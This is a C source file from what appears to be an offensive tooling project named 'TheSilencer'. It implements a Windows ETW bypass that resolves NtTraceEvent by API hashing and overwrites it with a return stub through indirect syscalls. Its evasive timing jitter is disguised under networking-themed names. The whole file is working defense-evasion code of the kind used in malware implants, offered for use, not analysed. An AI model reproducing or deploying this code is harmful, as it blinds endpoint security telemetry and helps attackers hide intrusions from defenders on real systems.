// "@Yenn.exe | TheSilencer Project 
// API hashing, dynamic key generation, and entropy-based timing functions

#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "Common.h"
#include "FunctionPntrs.h"
#include "Debug.h"

// Function type definitions for ETW bypass
typedef NTSTATUS (NTAPI* fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI* fnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

#define PAGE_CHUNK_SIZE 0x1000
#define MIN_JITTER 1
#define MAX_JITTER 10
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

extern NETWORK_CONFIG g_NetworkConfig;

// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Entropy-based timing function with variable range
VOID XmJitterSleepEx(DWORD minMs, DWORD maxMs) {
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    Sleep(minMs + (entropy % (maxMs - minMs + 1)));
}

// Original jitter sleep maintained for compatibility
VOID XmJitterSleep(VOID) {
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    Sleep(50 + (entropy % 500));
}
// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Helper function to calculate random chunk size
SIZE_T XmGetRandomChunkSize(VOID) {
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    return PAGE_CHUNK_SIZE + (entropy % PAGE_CHUNK_SIZE);
}

// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// ETW Bypass Implementation with chunked memory operations and jittering
BOOL XmBypassEtwProtection(VOID) {
#ifdef DEBUG
    PRINT("\n[*] Initializing ETW bypass with evasive patterns...\n");
#endif

    BOOL bSuccess = FALSE;
    PVOID pEtwAddress = NULL;
    SIZE_T sSize = 0;
    DWORD dwOldProtect = 0;
    // ret 4 for stack cleanup
    BYTE patchBytes[] = { 0xC2, 0x10, 0x00 }; // ret 0x10
    
    if (!g_NetworkConfig.bInitialized) {
#ifdef DEBUG
        PRINT("[-] Network configuration not initialized\n");
#endif
        return FALSE;
    }
    
    // Get ntdll handle using existing API resolution method
    HMODULE hNtdll = GetModuleHandleH(NET_PROTOCOL_DLL_HASH);
    if (!hNtdll) {
#ifdef DEBUG
        PRINT("[-] Failed to resolve ntdll.dll module\n");
#endif
        return FALSE;
    }

    XmJitterSleepEx(10, 30); // Add jitter between operations

    // Get ETW function address (NtTraceEvent)
    pEtwAddress = GetProcAddressH(hNtdll, NT_TRACEEVENT_HASH);
    if (!pEtwAddress) {
#ifdef DEBUG
        PRINT("[-] Failed to locate ETW trace function\n");
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[+] Located ETW trace function at 0x%p\n", pEtwAddress);
#endif

    // Setup for single write operation
    SIZE_T sPageSize = PAGE_CHUNK_SIZE;
    PVOID pBaseAddress = (PVOID)((ULONG_PTR)pEtwAddress & ~(PAGE_CHUNK_SIZE - 1));
    
    // Change page protection to RW
    SET_SYSCALL(g_NetworkConfig.TlsHandshake);
    NTSTATUS status = XmInvokeSystemCall(GetCurrentProcess(), &pBaseAddress, &sPageSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINT("[-] Failed to modify memory protection: 0x%X\n", status);
#endif
        return FALSE;
    }

    XmJitterSleepEx(MIN_JITTER, MAX_JITTER);

    // Direct patch using byte operations to avoid SEH
    volatile BYTE* pTarget = (volatile BYTE*)pEtwAddress;
    for (SIZE_T i = 0; i < sizeof(patchBytes); i++) {
        pTarget[i] = patchBytes[i];
    }
    bSuccess = TRUE;

    XmJitterSleepEx(MIN_JITTER, MAX_JITTER);

    // Restore original protection
    SET_SYSCALL(g_NetworkConfig.TlsHandshake);
    status = XmInvokeSystemCall(GetCurrentProcess(), &pBaseAddress, &sPageSize, dwOldProtect, &dwOldProtect);
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        PRINT("[-] Failed to restore memory protection: 0x%X\n", status);
#endif
        return FALSE;
    }

    if(bSuccess) {
#ifdef DEBUG
        PRINT("[+] ETW bypass successfully implemented\n");
#endif
        // Add final jitter for evasion
        XmJitterSleepEx(100, 300);
    }

    return bSuccess;
}

